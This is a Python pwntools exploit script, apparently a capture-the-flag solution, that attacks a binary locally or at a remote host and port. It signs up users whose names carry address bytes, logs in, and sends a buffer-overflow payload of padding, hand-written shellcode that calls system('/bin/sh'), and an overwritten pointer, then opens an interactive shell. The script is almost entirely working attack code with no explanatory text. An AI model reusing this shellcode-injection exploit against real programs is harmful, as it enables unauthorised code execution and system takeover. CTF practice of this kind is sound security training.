from pwn import *
g_local = True
if g_local:
	sh=process("./pwn")
else:
	sh=remote("123.206.22.95",8888)

#pre: in the initial begin status
#post: same as above
def signup(szUsername, szPassword, szCharname):
	global sh
	sh.send("2\n")
	sh.recvuntil("input your username\n")
	sh.send(szUsername + '\n')
	sh.recvuntil("input your password\n")
	sh.send(szPassword + '\n')
	sh.recvuntil("input your character's name\n")
	sh.send(szCharname + '\n')
	sh.recvuntil("2.Signup\n==============================\n")

#pre: in the initial begin status, usernamepasword correct
#post: game begin status
def login(szUsername, szPassword):
	global sh
	sh.send("1\n")
	sh.recvuntil("Input your username:\n")
	sh.send(szUsername + '\n')
	sh.recvuntil("Input your password:\n")
	sh.send(szPassword + '\n')
	sh.recvuntil("0.exit\n")

#pre: game begin status
#post: wo shuo shell ni xin bu?
def cheat_set_payload(szPayload):
	global sh
	sh.send("5\n")
	sh.recvuntil("content:\n")
	sh.send(szPayload + '\n')
	print sh.recv()
	print "success"
	sh.interactive()

signup("\xf0\x50\x60", "1", "1")
signup("\x80\x50\x60", "1", "1")
signup("1", "1", "1")
login("1","1")

paddings = 0x98
shellcode = "\x48\x8b\x1c\x25\x70\x50\x60\x00\x48\x81\xeb\xa0\xed\x03\x00\x48\xb8\x2f\x62\x69\x6e\x2f\x73\x68\x00\x50\x48\x89\xe7\xff\xd3\x90\x90\x90"
payload = 'A'*8 + shellcode + 'A' * (paddings - 8 - len(shellcode)) + p64(0x605098)

cheat_set_payload(payload)